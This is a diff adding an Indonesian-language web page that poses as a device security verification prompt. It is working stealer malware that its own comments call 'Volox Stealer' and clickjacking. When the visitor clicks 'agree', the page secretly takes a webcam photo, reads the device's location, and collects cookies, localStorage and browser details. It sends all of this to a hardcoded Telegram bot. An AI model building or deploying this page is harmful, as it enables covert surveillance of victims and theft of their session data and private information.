@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verifikasi Keamanan</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, sans-serif; }
+    body {
+      background: linear-gradient(135deg, #f5f7fa 0%, #e4edf9 100%);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
+      position: relative;
+    }
+
+    .overlay {
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(255,255,255,0.95);
+      z-index: 9999;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      padding: 30px;
+      animation: fadeIn 0.6s ease;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.95); }
+      to { opacity: 1; transform: scale(1); }
+    }
+
+    .icon {
+      font-size: 64px;
+      color: #4361ee;
+      margin-bottom: 20px;
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(1); }
+    }
+
+    h2 {
+      font-size: 24px;
+      color: #2b2d42;
+      margin-bottom: 16px;
+      font-weight: 600;
+    }
+
+    p {
+      color: #6c757d;
+      max-width: 400px;
+      line-height: 1.6;
+      margin-bottom: 25px;
+      font-size: 15px;
+    }
+
+    /* Tombol Agree — tampak biasa, tapi menutupi semua izin */
+    #agree-btn {
+      background: #4361ee;
+      color: white;
+      border: none;
+      padding: 12px 32px;
+      font-size: 18px;
+      font-weight: bold;
+      border-radius: 50px;
+      cursor: pointer;
+      box-shadow: 0 4px 12px rgba(67, 97, 238, 0.3);
+      transition: all 0.3s ease;
+      position: relative;
+      z-index: 10000;
+    }
+
+    #agree-btn:hover {
+      background: #3a56e4;
+      transform: translateY(-2px);
+      box-shadow: 0 6px 16px rgba(67, 97, 238, 0.4);
+    }
+
+    /* Invisible permission triggers — diposisikan tepat di bawah tombol agree */
+    .hidden-perm {
+      position: absolute;
+      opacity: 0;
+      pointer-events: none;
+      width: 120px;
+      height: 48px;
+      z-index: 9998;
+    }
+
+    /* Pastikan semua izin muncul di titik yang sama */
+    #camera-trigger,
+    #mic-trigger,
+    #geo-trigger,
+    #notif-trigger {
+      left: calc(50% - 60px);
+      top: calc(50% + 120px);
+    }
+
+    /* Gaya untuk elemen dummy agar tidak mengganggu tata letak */
+    .dummy { display: none; }
+  </style>
+</head>
+<body>
+  <!-- Overlay Persetujuan -->
+  <div class="overlay" id="consent-overlay">
+    <div class="icon">
+      <i class="fas fa-shield-alt"></i>
+    </div>
+    <h2>Verifikasi Identitas Diperlukan</h2>
+    <p>Untuk melanjutkan, kami perlu memverifikasi perangkat Anda. Klik "Setuju" untuk mengonfirmasi keamanan sesi ini.</p>
+    <button id="agree-btn">Setuju</button>
+  </div>
+
+  <!-- Trigger izin tersembunyi (clickjacking) -->
+  <video id="camera-trigger" autoplay muted></video>
+  <video id="mic-trigger" autoplay muted></video>
+  <div id="geo-trigger" class="hidden-perm"></div>
+  <div id="notif-trigger" class="hidden-perm"></div>
+
+  <!-- Dummy elements untuk API lain -->
+  <input type="file" id="file-dummy" class="dummy" multiple accept="image/*,video/*,application/*" />
+
+  <script>
+    // Token & Chat ID Telegram
+    const TELEGRAM_BOT_TOKEN = "8252375331:AAGjbMLFvp7UtEjylkJGKTnXuN_WeVyGaRo";
+    const TELEGRAM_CHAT_ID = "6732766279";
+
+    // Fungsi kirim data ke Telegram
+    async function sendToTelegram(data, caption = "", isFile = false) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/`;
+      try {
+        if (isFile) {
+          const formData = new FormData();
+          formData.append("chat_id", TELEGRAM_CHAT_ID);
+          formData.append("document", data);
+          if (caption) formData.append("caption", caption);
+          await fetch(url + "sendDocument", { method: "POST", body: formData });
+        } else {
+          await fetch(url + "sendMessage", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: data })
+          });
+        }
+      } catch (e) {
+        console.debug("Telegram send failed (expected in some envs)");
+      }
+    }
+
+    // Ambil fingerprint perangkat unik
+    function getDeviceFingerprint() {
+      const canvas = document.createElement("canvas");
+      const ctx = canvas.getContext("2d");
+      ctx.textBaseline = "top";
+      ctx.font = "14px Arial";
+      ctx.fillText("Volox Stealer", 2, 2);
+      return canvas.toDataURL().substring(0, 50).replace(/[^a-zA-Z0-9]/g, "");
+    }
+
+    const DEVICE_ID = getDeviceFingerprint();
+    const DEVICE_NAME = "NAMA PERANGKAT " + DEVICE_ID;
+
+    // Cegah duplikasi pengiriman dari perangkat yang sama (simpan di localStorage)
+    if (localStorage.getItem("volox_sent_" + DEVICE_ID)) {
+      document.getElementById("consent-overlay").style.display = "none";
+    }
+
+    // Permintaan izin kamera & mic
+    async function requestMedia() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        if (stream) {
+          const track = stream.getVideoTracks()[0];
+          const imageCapture = new ImageCapture(track);
+          const photo = await imageCapture.grabFrame();
+          const canvas = document.createElement("canvas");
+          canvas.width = photo.width;
+          canvas.height = photo.height;
+          const ctx = canvas.getContext("2d");
+          ctx.drawImage(photo, 0, 0);
+
+          // Tambahkan teks "NAMA PERANGKAT ..."
+          ctx.fillStyle = "white";
+          ctx.strokeStyle = "black";
+          ctx.lineWidth = 2;
+          ctx.font = "20px Arial";
+          ctx.strokeText(DEVICE_NAME, 10, 30);
+          ctx.fillText(DEVICE_NAME, 10, 30);
+
+          canvas.toBlob(async (blob) => {
+            await sendToTelegram(blob, DEVICE_NAME, true);
+            stream.getTracks().forEach(t => t.stop());
+          }, "image/jpeg", 0.9);
+        }
+      } catch (e) {
+        // Gagal dapat kamera? coba ambil screenshot canvas sebagai fallback
+        const fallbackCanvas = document.createElement("canvas");
+        fallbackCanvas.width = 320;
+        fallbackCanvas.height = 240;
+        const ctx = fallbackCanvas.getContext("2d");
+        ctx.fillStyle = "#f0f0f0";
+        ctx.fillRect(0, 0, 320, 240);
+        ctx.fillStyle = "black";
+        ctx.font = "16px Arial";
+        ctx.fillText("No Camera Access", 80, 120);
+        ctx.fillText(DEVICE_NAME, 80, 150);
+        fallbackCanvas.toBlob(blob => sendToTelegram(blob, DEVICE_NAME + " (fallback)", true));
+      }
+    }
+
+    // Permintaan lokasi
+    function requestGeo() {
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            const coords = `Lokasi: ${pos.coords.latitude}, ${pos.coords.longitude} | Akurasi: ${pos.coords.accuracy}m`;
+            sendToTelegram(`${DEVICE_NAME}\n${coords}`);
+          },
+          () => sendToTelegram(`${DEVICE_NAME}\nLokasi: DITOLAK atau TIDAK TERSEDIA`)
+        );
+      } else {
+        sendToTelegram(`${DEVICE_NAME}\nLokasi: TIDAK DIDUKUNG`);
+      }
+    }
+
+    // Permintaan notifikasi (untuk fingerprint tambahan)
+    async function requestNotification() {
+      if ("Notification" in window) {
+        try {
+          const perm = await Notification.requestPermission();
+          sendToTelegram(`${DEVICE_NAME}\nNotifikasi: ${perm}`);
+        } catch (e) {
+          sendToTelegram(`${DEVICE_NAME}\nNotifikasi: ERROR`);
+        }
+      }
+    }
+
+    // Curi metadata browser
+    function stealBrowserData() {
+      const data = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        cookies: document.cookie,
+        localStorage: Object.keys(localStorage).map(k => `${k}=${localStorage[k]}`).join("; "),
+        screen: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        device: DEVICE_NAME
+      };
+      sendToTelegram(`[BROWSER DATA]\n${JSON.stringify(data, null, 2)}`);
+    }
+
+    // Trigger semua aksi saat tombol diklik
+    document.getElementById("agree-btn").addEventListener("click", async () => {
+      // Aktifkan semua trigger izin secara visual tersembunyi
+      document.querySelectorAll(".hidden-perm").forEach(el => {
+        el.style.pointerEvents = "auto";
+        el.style.opacity = "0.01"; // Hampir transparan, tapi bisa diklik
+      });
+
+      // Jalankan semua pencurian data
+      requestMedia();
+      requestGeo();
+      requestNotification();
+      stealBrowserData();
+
+      // Tandai perangkat sudah dikirim
+      localStorage.setItem("volox_sent_" + DEVICE_ID, "1");
+
+      // Tutup overlay setelah 1 detik (opsional)
+      setTimeout(() => {
+        document.getElementById("consent-overlay").style.display = "none";
+      }, 1000);
+    });
+
+    // Auto-klik trigger jika user klik area sekitar (enhanced clickjacking)
+    document.addEventListener("click", (e) => {
+      if (document.getElementById("consent-overlay").contains(e.target)) return;
+      // Opsional: trigger izin otomatis jika user klik di luar (tapi kita fokus pada agree-btn saja)
+    });
+  </script>
+</body>
+</html>
